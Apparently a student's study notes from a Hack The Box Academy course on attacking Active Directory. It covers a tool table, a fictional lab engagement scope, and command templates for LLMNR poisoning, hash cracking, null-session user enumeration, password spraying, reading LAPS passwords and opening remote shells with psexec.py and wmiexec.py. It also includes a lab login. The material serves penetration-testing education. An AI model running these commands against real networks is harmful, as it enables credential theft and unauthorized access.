# Active Directory Enumeration & Attacks

**Module Link**: https://academy.hackthebox.com/module/details/143

### Module Summary

This module introduces AD enumeration and attack techniques in modern and legacy enterprise environments. We will cover core principles  surrounding AD, Enumeration tools such as Bloodhound and Kerbrute, and  attack TTPs such as taking advantage of SMB Null sessions, Password  spraying, ACL attacks, attacking domain trusts, and more.

In this module, we will cover:

- Foundational AD knowledge
- AD enumeration principles
- External Reconnaissance
- Internal enumeration and footprinting
- Lateral movement
- Enumerating and Exploiting Trusts
- Password spraying
- LLNNR/NBT-NS Poisoning
- Gaining privileged access
- Using native tools to perform actions
- Kerberoasting
- Performing ACL Attacks
- AD hardening principles

## Active Directory Explained

`Active Directory` (`AD`) is a directory  service for Windows enterprise environments that was officially  implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server  OS since. AD is based on the protocols x.500 and LDAP that came before  it and still utilizes these protocols in some form today. It is a  distributed, hierarchical structure that allows for centralized  management of an organization’s resources, including users, computers,  groups, network devices and file shares, group policies, devices, and  trusts. AD provides `authentication, accounting, and authorization` functions within a Windows enterprise environment. If this is your  first time learning about Active Directory or hearing these terms, check out the [Intro To Active Directory](https://academy.hackthebox.com/catalogue) module for a more in-depth look at the structure and function of AD, AD objects, etc.

------

## Why Should We Care About AD?

At the time of writing this module, Microsoft Active Directory holds around `43%` of the [market share](https://www.slintel.com/tech/identity-and-access-management/microsoft-active-directory-market-share#faqs) for enterprise organizations utilizing `Identity and Access management` solutions. This is a huge portion of the market, and it isn't likely to go anywhere any time soon since Microsoft is improving and blending  implementations with Azure AD. Another interesting stat to consider is  that just in the last two years, Microsoft has had over `2000` reported vulnerabilities tied to a [CVE](https://www.cvedetails.com/vendor/26/Microsoft.html). AD's many services and main purpose of making information easy to find  and access make it a bit of a behemoth to manage and correctly harden.  This exposes enterprises to vulnerabilities and exploitation from simple misconfigurations of services and permissions. Tie these  misconfigurations and ease of access with common user and OS  vulnerabilities, and you have a perfect storm for an attacker to take  advantage of. With all of this in mind, this module will explore some of these common issues and show us how to identify, enumerate, and take  advantage of their existence. We will practice enumerating AD utilizing  native tools and languages such as `Sysinternals`, `WMI`, `DNS`, and many others. Some attacks we will also practice include `Password spraying`, `Kerberoasting`, utilizing tools such as `Responder`, `Kerbrute`, `Bloodhound`, and much more.

We may often find ourselves in a network with no clear path to a  foothold through a remote exploit such as a vulnerable application or  service. Yet, we are within an Active Directory environment, which can  lead to a foothold in many ways. The general goal of gaining a foothold  in a client's AD environment is to `escalate privileges` by  moving laterally or vertically throughout the network until we  accomplish the intent of the assessment. The goal can vary from client  to client. It may be accessing a specific host, user's email inbox,  database, or just complete domain compromise and looking for every  possible path to Domain Admin level access within the testing period.  Many open-source tools are available to facilitate enumerating and  attacking Active Directory. To be most effective, we must understand how to perform as much of this enumeration manually as possible. More  importantly, we need to understand the "why" behind certain flaws and  misconfigurations. This will make us more effective as attackers and  equip us to give sound recommendations to our clients on the major  issues within their environment, as well as clear and actionable  remediation advice.

We need to be comfortable enumerating and attacking AD from both  Windows and Linux, with a limited toolset or built-in Windows tools,  also known as "`living off the land`." It is common to run  into situations where our tools fail, are being blocked, or we are  conducting an assessment where the client has us work from a `managed workstation` or `VDI instance` instead of the customized Linux or Windows attack host we may have  grown accustomed to. To be effective in all situations, we must be able  to adapt quickly on the fly, understand the many nuances of AD and know  how to access them even when severely limited in our options.

# Tools of the Trade

------

Many of the module sections require tools such as open-source scripts or precompiled binaries. These can be found in the `C:\Tools` directory on the Windows hosts provided in the sections aimed at  attacking from Windows. In sections that focus on attacking AD from  Linux, we provide a Parrot Linux host customized for the target  environment as if you were an anonymous user with an attack host within  the internal network. All necessary tools and scripts are preloaded on  this host (either installed or in the `/opt` directory).  Here is a listing of many of the tools that we will cover in this module:

| Tool                                                         | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)/[SharpView](https://github.com/dmchell/SharpView) | A PowerShell tool and a .NET port of the same used to gain  situational awareness in AD. These tools can be used as replacements for various Windows `net*` commands and more. PowerView and  SharpView can help us gather much of the data that BloodHound does, but  it requires more work to make meaningful relationships among all of the  data points. These tools are great for checking what additional access  we may have with a new set of credentials, targeting specific users or  computers, or finding some "quick wins" such as users that can be  attacked via Kerberoasting or ASREPRoasting. |
| [BloodHound](https://github.com/BloodHoundAD/BloodHound)     | Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a [Neo4j](https://neo4j.com/) database for graphical analysis of the AD environment. |
| [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) | The C# data collector to gather information from Active Directory  about varying AD objects such as users, groups, computers, ACLs, GPOs,  user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for  analysis. |
| [BloodHound.py](https://github.com/fox-it/BloodHound.py)     | A Python-based BloodHound ingestor based on the [Impacket toolkit](https://github.com/CoreSecurity/impacket/). It supports most BloodHound collection methods and can be run from a  non-domain joined attack host. The output can be ingested into the  BloodHound GUI for analysis. |
| [Kerbrute](https://github.com/ropnop/kerbrute)               | A tool written in Go that uses Kerberos Pre-Authentication to  enumerate Active Directory accounts, perform password spraying, and  brute-forcing. |
| [Impacket toolkit](https://github.com/SecureAuthCorp/impacket) | A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating  and attacking Active Directory. |
| [Responder](https://github.com/lgandx/Responder)             | Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions. |
| [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) | Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks. |
| [C# Inveigh (InveighZero)](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh) | The C# version of Inveigh with a semi-interactive console for  interacting with captured data such as username and password hashes. |
| [rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo) | The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command  "rpcinfo -p 10.0.0.1" will return a list of all the RPC services  available on the remote host, along with their program number, version  number, and protocol. Note that this command must be run with sufficient privileges. |
| [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) | A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote  RPC service. |
| [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec) | CME is an enumeration, attack, and post-exploitation toolkit which  can help us greatly in enumeration and performing attacks with the data  we gather. CME attempts to "live off the land" and abuse built-in AD  features and protocols like SMB, WMI, WinRM, and MSSQL. |
| [Rubeus](https://github.com/GhostPack/Rubeus)                | Rubeus is a C# tool built for Kerberos Abuse.                |
| [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) | Another Impacket module geared towards finding Service Principal names tied to normal users. |
| [Hashcat](https://hashcat.net/hashcat/)                      | A great hash cracking and password recovery tool.            |
| [enum4linux](https://github.com/CiscoCXSecurity/enum4linux)  | A tool for enumerating information from Windows and Samba systems. |
| [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)      | A rework of the original Enum4linux tool that works a bit differently. |
| [ldapsearch](https://linux.die.net/man/1/ldapsearch)         | Built-in interface for interacting with the LDAP protocol.   |
| [windapsearch](https://github.com/ropnop/windapsearch)       | A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries. |
| [DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. |
| [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)     | The toolkit includes functions written in PowerShell that leverage  PowerView to audit and attack Active Directory environments that have  deployed Microsoft's Local Administrator Password Solution (LAPS). |
| [smbmap](https://github.com/ShawnDEvans/smbmap)              | SMB share enumeration across a domain.                       |
| [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) | Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell. |
| [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) | Part of the Impacket toolkit, it provides the capability of command execution over WMI. |
| [Snaffler](https://github.com/SnaffCon/Snaffler)             | Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares. |
| [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) | Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network. |
| [setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) | Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account. |
| [Mimikatz](https://github.com/ParrotSec/mimikatz)            | Performs many functions. Notably, pass-the-hash attacks, extracting  plaintext passwords, and Kerberos ticket extraction from memory on a  host. |
| [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) | Remotely dump SAM and LSA secrets from a host.               |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm)      | Provides us with an interactive shell on a host over the WinRM protocol. |
| [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) | Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases. |
| [noPac.py](https://github.com/Ridter/noPac)                  | Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user. |
| [rpcdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py) | Part of the Impacket toolset, RPC endpoint mapper.           |
| [CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) | Printnightmare PoC in python.                                |
| [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) | Part of the Impacket toolset, it performs SMB relay attacks. |
| [PetitPotam.py](https://github.com/topotam/PetitPotam)       | PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate  to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions. |
| [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) | Tool for manipulating certificates and TGTs.                 |
| [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) | This tool will use an existing TGT to request a PAC for the current user using U2U. |
| [adidnsdump](https://github.com/dirkjanm/adidnsdump)         | A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer. |
| [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)       | Extracts usernames and passwords from Group Policy preferences files. |
| [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) | Part of the Impacket toolkit. Used to perform the ASREPRoasting  attack to list and obtain AS-REP hashes for users with the 'Do not  require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking. |
| [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) | SID bruteforcing tool.                                       |
| [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) | A tool for creation and customization of TGT/TGS tickets. It can be  used for Golden Ticket creation, child to parent trust attacks, etc. |
| [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) | Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation. |
| [Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) | Active Directory Explorer (AD Explorer) is an AD viewer and editor.  It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database  for offline analysis. When an AD snapshot is loaded, it can be explored  as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security  permissions. |
| [PingCastle](https://www.pingcastle.com/documentation/)      | Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on [CMMI](https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration) adapted to AD security). |
| [Group3r](https://github.com/Group3r/Group3r)                | Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO). |
| [ADRecon](https://github.com/adrecon/ADRecon)                | A tool used to extract various data from a target AD environment.  The data can be output in Microsoft Excel format with summary views and  analysis to assist with analysis and paint a picture of the  environment's overall security state. |

# Scenario

------

We are Penetration Testers working for `CAT-5 Security`.  After a few successful engagements shadowing with the team, the more  senior members want to see how well we can do starting an assessment on  our own. The team lead sent us the following email detailing what we  need to accomplish.

#### Tasking Email

![image](https://academy.hackthebox.com/storage/modules/143/scenario-email.png)

This module will allow us to practice our skills (both prior and  newly minted) with these tasks. The final assessment for this module is  the execution of `two` internal penetration tests against the company Inlanefreight. During these assessments, we will work through  an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the  internal network as clients often request. Completing the skills  assessments signifies the successful completion of the tasks mentioned  in the scoping document and tasking email above. In doing so, we will  demonstrate a firm grasp of many automated and manual AD attack and  enumeration concepts, knowledge of and experience with a wide array of  tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in  this module is meant to cover core enumeration concepts necessary for  anyone to be successful in performing internal penetration tests in  Active Directory environments. We will also cover many of the most  common attack techniques in great depth while working through some more  advanced concepts as a primer for AD-focused material that will be  covered in more advanced modules.

Below you will find a completed scoping document for the engagement  containing all pertinent information provided by the customer.

------

## Assessment Scope

The following `IPs`, `hosts`, and `domains` defined below make up the scope of the assessment.

#### In Scope For Assessment

| **Range/Domain**                | **Description**                                              |
| ------------------------------- | ------------------------------------------------------------ |
| `INLANEFREIGHT.LOCAL`           | Customer domain to include AD and web services.              |
| `LOGISTICS.INLANEFREIGHT.LOCAL` | Customer subdomain                                           |
| `FREIGHTLOGISTICS.LOCAL`        | Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL |
| `172.16.5.0/23`                 | In-scope internal subnet.                                    |
|                                 |                                                              |

#### Out Of Scope

- `Any other subdomains of INLANEFREIGHT.LOCAL`
- `Any subdomains of FREIGHTLOGISTICS.LOCAL`
- `Any phishing or social engineering attacks`
- `Any other IPS/domains/subdomains not explicitly mentioned`
- `Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module`

------

## Methods Used

The following methods are authorized for assessing Inlanefreight and its systems :

### External Information Gathering (Passive Checks)

External information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors  will conduct external information gathering from an anonymous  perspective on the internet with no information provided in advance  regarding Inlanefreight outside of what is provided within this  document.

Cat-5 will perform passive enumeration to uncover information that  may help with internal testing. Testing will employ various degrees of  information gathering from open-source resources to identify publicly  accessible data that may pose a risk to Inlanefreight and assist with  the internal penetration test. No active enumeration, port scans, or  attacks will be performed against internet-facing "real-world" IP  addresses or the website located at `https://www.inlanefreight.com`.

### Internal Testing

The internal assessment portion is designed to demonstrate the risks  associated with vulnerabilities on internal hosts and services ( `Active Directory specifically`) by attempting to emulate attack vectors from within Inlanefreight's  area of operations. The result will allow Inlanefreight to assess the  risks of internal vulnerabilities and the potential impact of a  successfully exploited vulnerability.

To simulate a real-world attack, Cat-5 will conduct the assessment  from an untrusted insider perspective with no advance information  outside of what's provided in this documentation and discovered from  external testing. Testing will start from an anonymous position on the  internal network with the goal of obtaining domain user credentials,  enumerating the internal domain, gaining a foothold, and moving  laterally and vertically to achieve compromise of all in-scope internal  domains. Computer systems and network operations will not be  intentionally interrupted during the test.

### Password Testing

Password files captured from Inlanefreight devices, or provided by  the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment  goals. At no time will a captured password file or the decrypted  passwords be revealed to persons not officially participating in the  assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official  contract between Cat-5 and Inlanefreight.

------

We provided the above scoping documentation so  we become used to seeing this style of documentation. As we progress  through our Infosec Careers, especially on the offensive side, it will  be common to receive scoping documents and Rules of Engagement (RoE)  documents that outline these types of information. 

------

## The Stage Is Set

Now that we have our scope clearly defined for this module, we can  dive into exploring Active Directory enumeration and attack vectors.  Now, let's dive into performing passive external enumeration against  Inlanefreight.

# External Recon and Enumeration Principles

**Tools:**

- https://bgp.he.net/
- https://viewdns.info/
- Nslookup
- Google Dorks

# Initial Enumeration of the Domain

**Tools:**

- Wireshark
- Tcpdump
- Responder
- fping
- Nmap
- kerbrute

**Commands:**

Responder:

```bash
sudo responder -I {INTERFACE} -A
```

fping:

```bash
fping -asgq {IP RANGE}
```

Nmap:

```bash
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

kerbrute:

```bash
kerbrute userenum -d {DOMAIN} --dc {DC IP} {WORDLIST} -o valid_ad_users
```

# Sniffing out a Foothold

## LLMNR/NBT-NS Poisoning - from Linux

**Tools:**

- responder
- hashcat
- john
- Inveigh
- Metasploit

**Commands:**

hashcat:

```bash
hashcat -m {Mode Number} {File} {Wordlist}
Example: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Note:** Mode list --> https://hashcat.net/wiki/doku.php?id=example_hashes

## LLMNR/NBT-NS Poisoning - from Windows

**Tools:**

- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

**Commands:**

xfreerdp:

```bash
xfreerdp /u:'{USER}' /p:'{PASS}' /v:{IP}
Example: xfreerdp /u:'htb-student' /p:'Academy_student_AD!' /v:10.129.180.243
```

Inveigh.ps1 - OUTDATED:

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
Example: Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

Inveigh.exe:

```powershell
.\Inveigh.exe
```

# Sighting In, Hunting For A User

## Enumerating & Retrieving Password Policies

**Tools:**

- CrackMapExec
- NetExec
- rpcclient
- enum4linux
- enum4linux-ng
- windapsearch
- ldapsearch
- ldapdomaindump
- PowerView.ps1
- smbclient
- net.exe

**Commands - From Linux:**

crackmapexec:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --pass-pol
```

rpcclient - Null session:

```bash
rpcclient -U "" -N {IP}

rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

enum4linux:

```bash
enum4linux -P {IP}
```

ldapsearch:

```bash
ldapsearch -h {IP} -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**Commands - From Windows:**

net.exe:

```cmd
net accounts
```

Powerview:

```powershell
Get-DomainPolicy
```

## Password Spraying - Making a Target User List

**Tools:**

- kerbrute
- Responder
- crackmapexec
- windapsearch
- ldapsearch
- enum4linux
- linkedin2username

**Commands:**

enum4linux - without creds:

```bash
enum4linux -U {IP}  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

rpcclient - null login:

```bash
rpcclient -U "" -N {IP}

rpcclient $> enumdomusers
```

crackmapexec - without creds: 

```bash
crackmapexec smb {IP} --users
```

ldapsearch - without creds:

```bash
ldapsearch -h {IP} -x -b "DC={DOMAIN},DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

windapsearch - without creds:

```
windapsearch.py --dc-ip {IP} -u "" -U
```

kerbrute:

```bash
kerbrute userenum -d {DOMAIN} --dc {IP} {WORDLIST}
```

crackmapexec - with creds:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --users
```

# Spray Responsibly

## Internal Password Spraying - from Linux

**Tools:**

- kerbrute
- rpcclient
- crackmapexec

**Commands:**

rpcclient - one liner:

```bash
for u in $(cat {WORDLIST});do rpcclient -U "$u%{PASS}" -c "getusername;quit" {IP} | grep Authority; done
```

kerbrute:

```bash
kerbrute passwordspray -d {DOMAIN} --dc {IP} {WORDLIST} {PASS}
```

crackmapexec: 

```bash
crackmapexec smb {IP} -u {WORDLIST} -p {PASS} --continue-on-success
```

## Internal Password Spraying - from Windows

**Tools:**

- DomainPasswordSpray

**Commands:**

DomainPasswordSpray - host domain-joined:

```powershell
Invoke-DomainPasswordSpray -Password {PASS} -OutFile {FILE_NAME} -ErrorAction SilentlyContinue
```

# Deeper Down the Rabbit Hole

## Enumerating Security Controls

**Tools:**

- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

**Commands:**

Get-MpComputerStatus - Checking the Status of Defender:

```powershell
Get-MpComputerStatus
```

Get-AppLockerPolicy:

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

PowerShell Constrained Language Mode Enumeration:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Find-LAPSDelegatedGroups:

```powershell
Find-LAPSDelegatedGroups
```

Find-AdmPwdExtendedRights (checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All  Extended Rights" can read LAPS passwords and may be less protected than  users in delegated groups, so this is worth checking for.):

```powershell
Find-AdmPwdExtendedRights
```

Get-LAPSComputers (search for computers that have LAPS enabled when passwords expire, and  even the randomized passwords in cleartext if our user has access.):

```powershell
Get-LAPSComputers
```

## Credentialed Enumeration - from Linux

**Tools:**

- Crackmapexec
- SMBmap
- rpcclient
- wmiexec
- psexec
- windapsearch
- bloodhound

**Commands:**

CME - Domain User Enumeration:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --users
```

CME - Domain Group Enumeration:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --groups
```

CME - Logged On Users:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --loggedon-users
```

CME - Share Searching:

```bash
crackmapexec smb {IP} -u {USER} -p {PASS} --shares
```

SMBmap:

```bash
smbmap -u {USER} -p {PASS} -d {DOMAIN} -H {IP}
```

rpcclient - Null Session:

```bash
rpcclient -U "" -N {IP}
```

psexec:

```bash
psexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}  
```

wmiexec:

```bash
wmiexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}  
```

windapsearch - Enumerate Domain Admins:

```bash
windapsearch.py --dc-ip {IP} -u {USER}@{DOMAIN} -p {PASS} --da
```

windapsearch - Privileged Users:

```bash
windapsearch.py --dc-ip {IP} -u {USER}@{DOMAIN} -p {PASS} -PU
```

